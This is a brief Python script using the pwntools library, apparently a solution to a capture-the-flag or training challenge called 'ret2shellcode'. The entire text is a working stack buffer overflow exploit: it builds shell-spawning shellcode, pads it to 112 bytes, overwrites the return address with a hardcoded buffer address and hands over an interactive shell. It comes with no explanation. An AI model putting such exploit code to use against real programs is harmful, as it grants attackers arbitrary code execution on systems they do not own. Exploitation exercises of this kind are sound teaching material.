from pwn import *

sh = process('./ret2shellcode')
shellcode = asm(shellcraft.sh())
target = 0x0804a080

sh.sendline(shellcode.ljust(112, b'A')  + p32(target))
sh.interactive()